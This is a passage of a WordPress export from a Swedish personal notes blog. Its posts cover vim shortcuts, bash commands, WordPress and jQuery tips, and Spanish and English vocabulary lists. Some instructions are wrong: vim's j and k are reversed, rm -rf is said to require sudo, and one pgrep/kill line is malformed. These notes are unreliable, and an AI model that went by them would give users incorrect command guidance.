		<pubDate>Tue, 14 Apr 2015 15:45:37 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=86</guid>
		<description></description>
		<content:encoded><![CDATA[Bra vi/vim-kommandon att använda. Här finns ett <a href="http://bullium.com/support/vim.html">cheatsheet</a>.
<h2>För att komma in i kommandoläge:</h2>
ESC + :
<h2>För att komma in i insertläge:</h2>
i
<h2>Kommandon:</h2>
w - spara

wq - spara och avsluta

q! - spara inte
<h2>Flytta pekare</h2>
h - vänster

l - höger

j - upp

k - ner

längst ner i filen - G

längst upp i filen - gg

A - flyttar markören till sista karaktären i en rad.

I - flyttar markören till första karaktären i en rad.
<h2>Ta bort</h2>
x - ta bort enskild tecken

dd - tar bort en hel rad

dG - tar bort allt nedanför markören.
<h2>Redigera text</h2>
o - ny rad

<h2>Fixa indentering</h2>
Detta är just nu mitt favoritkommando. Tänk dig att indenteringen är helt knasig och felaktig, istället för att för hand gå igenom å fixa det så kan du göra följande.

Först ställ markören längst upp på dokumentet (gg). Därefter skriv =G
Då fixas indenteringen automatiskt.

<h1>Söka</h1>
<h2>Sätt 1</h2>
<h3>I kommandoläge:</h3>
<pre>/dinsökning</pre>
Klicka sedan på <strong>n</strong> för att se nästa sökresultat, och <strong>N</strong> (stor bokstav) för att se föregående sökresultat.
<h2>Sätt 2</h2>
I kommandoläge placera markören på det ord du vill söka efter. Klicka sedan på <strong>*</strong>, och du transporteras automatiskt till nästa tillfälle där det ordet använts.
<h1>Kopiera</h1>
För att kopiera inom VIM.

1. Gå in i kommandoläga.

2. Placera markören där du vill började kopiera.

3. Klicka <strong>v</strong> och markera området som du vill kopiera.

4. Klicka <strong>y</strong> för att kopiera och <strong>d</strong> för att klippa ut.

5. Klicka <strong>p</strong> för att klista in.

<strong>För att kopiera utanför vim.</strong>

1. Markera texten du vill kopiera.

2. Klicka <strong>"</strong>+<strong>y</strong>

3. Gå till de dokument där du vill klistra in och kör <strong>Crl+p</strong>.

<h2>Split window</h2>
Ibland kan det vara effektivt att ha två dokument uppe i samma fönster. Om man till exempel redigerar en css och html-dokument samtidigt.

För att öppna ett nytt dokument
<strong>:split filename</strong>
Till exempel:
<strong>:split css/style.css</strong>

För att göra så att fönstrena blir 50% vardera. Använd kommandot:
<strong>ctr-w och snabbt däreftet =</strong>
alltså <strong>ctr-w =</strong>

För att gå mellan fönster används kommandot<strong>
ctr-w</strong>

Här är en bra <a href="https://www.cs.oberlin.edu/~kuperman/help/vim/windows.html">guide</a> för split window kommandon. ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>86</wp:post_id>
		<wp:post_date>2015-04-14 15:45:37</wp:post_date>
		<wp:post_date_gmt>2015-04-14 15:45:37</wp:post_date_gmt>
		<wp:comment_status>closed</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>vivim-kommandon</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="how-to"><![CDATA[how-to]]></category>
		<category domain="post_tag" nicename="vim"><![CDATA[vim]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<category domain="category" nicename="webbdesign"><![CDATA[webbdesign]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>switch_like_status</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[10855937008]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[86]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[86]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Specialskrivet utdrag till inlägg i wordpress</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/20/specialskrivet-utdrag-till-inlagg-i-wordpress/</link>
		<pubDate>Mon, 20 Apr 2015 23:17:26 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=113</guid>
		<description></description>
		<content:encoded><![CDATA[Att skriva ett eget utdrag (excerpt) för en bloggpost är enkelt. Det krävs ingen kodning. Bara gå in på inlägget i dashboarden och klicka sedan på panelinställningar, kryssa där i "utdrag", och scrolla ner på sidan. Där finns nu ett fält där du kan skriva ditt eget utdrag.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>113</wp:post_id>
		<wp:post_date>2015-04-20 23:17:26</wp:post_date>
		<wp:post_date_gmt>2015-04-20 23:17:26</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>specialskrivet-utdrag-till-inlagg-i-wordpress</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="how-to"><![CDATA[how-to]]></category>
		<category domain="post_tag" nicename="utdrag"><![CDATA[utdrag]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[113]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[113]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Min drömdebatt</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/22/min-dromdebatt/</link>
		<pubDate>Wed, 22 Apr 2015 18:38:04 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=116</guid>
		<description></description>
		<content:encoded><![CDATA[Debatt mellan följande, rörande en fråga som ingen har expertkunskap inom:

Stephen Hawkins

David Miscavige

Två slags alfahanar:

Dörrvakt

Kirurg

Hans Rosling

Maskin som klarar Turingtestet

Wittgenstein]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>116</wp:post_id>
		<wp:post_date>2015-04-22 18:38:04</wp:post_date>
		<wp:post_date_gmt>2015-04-22 18:38:04</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>min-dromdebatt</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[116]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[116]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Udda kommunikationsmedel</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/22/udda-kommunikationsmedel/</link>
		<pubDate>Wed, 22 Apr 2015 20:19:26 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=118</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="https://en.wikipedia.org/wiki/Slit_drum">Trummor</a>. <a href="https://books.google.cl/books?id=UtzcYJNVrSIC&amp;pg=PA95&amp;lpg=PA95&amp;dq=binary+drum+communication&amp;source=bl&amp;ots=Q-BK1mhMR9&amp;sig=WIuuaBl78plaQi7Of806_fGpSsw&amp;hl=en&amp;sa=X&amp;ei=Yfw3VY-jEKTksATm1oHwBA&amp;redir_esc=y#v=onepage&amp;q=binary%20drum%20communication&amp;f=false">Trummor</a> har i vissa delar av Afrika och Asien används som kommunikationsmedel. Informationen har då skickats binärt. Trumman var skapad så att två distinkt olika ljud kunde skapas. Datorer är alltså inte den första sofistikerade kommunikationsmedlet att använda sig av binär. Den binärt baserade kommunikationen fungerade även inom ett nätverk. By till by skickade meddelande, och informationen kunde röra sig i en hastighet av 100 miles i timmen.

Duvor

Flaggor

Horn

Eld

Rök

Flashing mirrors]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>118</wp:post_id>
		<wp:post_date>2015-04-22 20:19:26</wp:post_date>
		<wp:post_date_gmt>2015-04-22 20:19:26</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>udda-kommunikationsmedel</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="artikelide"><![CDATA[artikelidé]]></category>
		<category domain="post_tag" nicename="binart"><![CDATA[binärt]]></category>
		<category domain="post_tag" nicename="kommunikation"><![CDATA[kommunikation]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[118]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[118]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Ord: Samfällighet</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/23/ord-samfallighet/</link>
		<pubDate>Thu, 23 Apr 2015 01:52:19 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=123</guid>
		<description></description>
		<content:encoded><![CDATA[Ordet samfällighet kommer nog att plockas upp av vänstern nån gång. Gemenskaper, common, och snart samfällighet.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>123</wp:post_id>
		<wp:post_date>2015-04-23 01:52:19</wp:post_date>
		<wp:post_date_gmt>2015-04-23 01:52:19</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>ord-samfallighet</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[123]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[123]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Ta bort funktion i child-theme</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/23/ta-bort-funktion-i-child-theme/</link>
		<pubDate>Thu, 23 Apr 2015 19:13:04 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=128</guid>
		<description></description>
		<content:encoded><![CDATA[1. CSS

Ett sätt. Antagligen det vanligaste är helt enkelt att gå in i style.css och skriva ut, som exempel:

<code>.author.vcard {

display: none;

}</code>

Vilken kod som skall ändras hittas enklast genom att använda firefox-tillägget firebug som hittar css-taggarna hos olika element på hemsidor. 

Negativa: Skripten körs fortfarande. Så hemsidan går inte nödvändigtvis snabbare, bara för att man tar bort CSS. 

2. Importera filen och sedan ändra den.
Negativa: Man får inte tillgång till tema-uppdateringarna.

3. Skriva ut funktioner i functiones.php. <a href="http://code.tutsplus.com/tutorials/how-to-modify-the-parent-theme-behavior-within-the-child-theme--wp-31006">Här finns en bra förklaring.</a> Filter å sånt.
Fördel: DÅ kan man uppdatera temat utan att behöva göra om ändringarna. ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>128</wp:post_id>
		<wp:post_date>2015-04-23 19:13:04</wp:post_date>
		<wp:post_date_gmt>2015-04-23 19:13:04</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>ta-bort-funktion-i-child-theme</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="how-to"><![CDATA[how-to]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[128]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[128]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Bra bashkommandon</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/24/bra-terminalkommandon/</link>
		<pubDate>Fri, 24 Apr 2015 15:44:53 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=136</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>Allmänt</strong>
win; stoppar tidigare commando
# - betyder kommentar

<strong>Söka</strong>

Söka igenom filer efter specifikt ord. -R betyder att den söker rekursivt, alltså går igenom undermappar.

grep -R [ord] /Users/davocomp/mapp

<strong>Exempel:</strong> grep -R hejsan /Users/davocomp/mapp

Ett annat sätt att söka är att använda find.
find ~/dinMapp -iname "*ord*"
Detta gör att du söker i mappen dinMapp, -iname gör att du söker stora och små bokstäver. * är en wildcard innan och efter sökningsordet.

<strong>Öppna application</strong>
på mac är det:
open -a namnpåapplication

<strong>Stänga applicationer</strong>
<strong>osascript -e 'quit app "APPLICATIONNAME"'</strong>
Exempel: osascript -e 'quit app "Calendar"'

Ett annat är att hitta applicationens PID å sen stänga genom det.
det kan göras genom kommandot
pgrep Safari
eller ps -ax | grep Safari
sedan kill 467
eller tillsammans:
kill `pgrep 456`
ett annat sätt är att köra följande kombination
<strong>pgrep Skype | xargs kill</strong>



<strong>TOP</strong>
För att visa vilka processorer som är aktiva så kan man använda top.
För att se vilka processer som kostar mest så använd:
top -o cpu 

<strong>Kopiera</strong>
cp namnpafil namnpakopieradfil
cp /plats/fran/var/filen/Finns.tx /till/plats/du/vill/kopiera

Ta bort
rm namnpåfil
rmdir namnpåmapp

<strong>Lista filer</strong>
<strong>ls</strong>
<strong>la</strong>
<strong>ls -S</strong> För att sortera efter size. 

<strong>Ladda ner</strong>
curl är ett bra sätt att ladda ner sidor
curl http://www.dn.se
om du sedan vill spara hela html-dokumentet i en fil så gör du
curl http://www.dn.se &gt;&gt; namnpåfil
om du vill söka igenom filen och bara spara de rader som berör något specifik så kan du använda:
curl http://www.dn.se | egrep sökning &gt;&gt; output
För att ta bort alla filer och mappar som finns i en mapp använd följande kommando med stor försiktighet. Det krävs sudo för att köra det. Och om du använder det fel, å tar bort hela filsystemet så är datorn körd.
rm -rf namnpåmapp

<strong>Skapa ett helt directory tree med ett kommando</strong>
Extremt användbart.
mkdir -p public/{js,css} data views/{controller,views}
Detta kommando kommer alltså skapa ett träd som ser ut som följande 

public|
---------js|
---------css|
data|
view|
-------controller
-------views]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>136</wp:post_id>
		<wp:post_date>2015-04-24 15:44:53</wp:post_date>
		<wp:post_date_gmt>2015-04-24 15:44:53</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>bra-terminalkommandon</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="how-to"><![CDATA[how-to]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[16328665013]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[136]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[136]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>JQuery på lokal dator</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/04/25/jquery-pa-lokal-dator/</link>
		<pubDate>Sat, 25 Apr 2015 22:05:24 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=160</guid>
		<description></description>
		<content:encoded><![CDATA[JQuery är, som jag förstått det, ett javascripsbibliotek. För att en hemsida ska kunna använda sig av biblioteket måste det laddas ner. Ett sätt är att ladda ner det till datorn eller till servern. Det andra sättet är att låta biblioteket laddas ner från google.

Att låta biblioteket laddas ner från google medför flera fördelar, här är de två främsta:

1. Eftersom google har ett nätverk av servrar runt om i hela världen så kommer nedladdningen av biblioteket sannolikt gå fortare om det sker via dom, istället för min server. Om en chilenare vill gå in på min hemsida måste de ladda ner biblioteket från min server i Sverige, men om jag använt mig av googles hosting så skulle de ladda ner informationen från en server som antagligen står närmare Chile.

2. Den andra fördelen har å göra med caching. Sidbesökaren har kanske redan cachat biblioteket vid besök av en annan sida. I så fall behöver hen inte ens ladda ner biblioteket, vilket gör att sidan laddas ännu snabbare.

I html-koden skall ordningen vara följande: först länk till CSS, sedan http-länk till jQuery-biblioteket, och därefter länk till det lokala scriptet. Biblioteket måste först hämtas innan det lokala scriptet kan förstås. Om det är motsatta så kommer inte skriptet känna till funktionerna.
[code language="html"]&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js&quot;&gt;&lt;/script&gt;

&lt;script src=&quot;script.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;[/code]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>160</wp:post_id>
		<wp:post_date>2015-04-25 22:05:24</wp:post_date>
		<wp:post_date_gmt>2015-04-25 22:05:24</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>jquery-pa-lokal-dator</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="how-to"><![CDATA[how-to]]></category>
		<category domain="category" nicename="jquery"><![CDATA[jQuery]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[160]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[160]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Spanskaord</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/03/spanskaord/</link>
		<pubDate>Sun, 03 May 2015 15:20:41 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=167</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>Verktyg</strong>

skruv - tornillo
skruvmejsel - destornillador

<strong>Köket</strong>

durkslag - colador

djup tallrik - plato hondo

burk - frasco

skål - bol
<strong>Mat</strong>
fullkorsbröd - pan integral

spannmål - cereal

vete - trigo

råg - centeno

havre - avena

korn - cebada



<strong>Hemmet</strong>
långkalsonger - calsonzillo largo

kalsonger - calzoncillos

<strong>Övrigt</strong>
förakta - despreciar

förnedra - humillar

jag förstår - me doy cuenta

mening (som i flera olika ord tillsammans) - la frase

skill - habilidad

givande - gratificante

att utmana - retar]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>167</wp:post_id>
		<wp:post_date>2015-05-03 15:20:41</wp:post_date>
		<wp:post_date_gmt>2015-05-03 15:20:41</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>spanskaord</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="spanska"><![CDATA[spanska]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[167]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[167]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Engelskaord</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/05/03/engelskaord/</link>
		<pubDate>Sun, 03 May 2015 15:41:40 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=169</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>Throttle</strong> - strypa

Toggle - av-och-på-knapp.

Cornucopia - the horn of pleny. symbol funnen i klassisk västerländsk konst. symbolen betyder överflöd.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>169</wp:post_id>
		<wp:post_date>2015-05-03 15:41:40</wp:post_date>
		<wp:post_date_gmt>2015-05-03 15:41:40</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
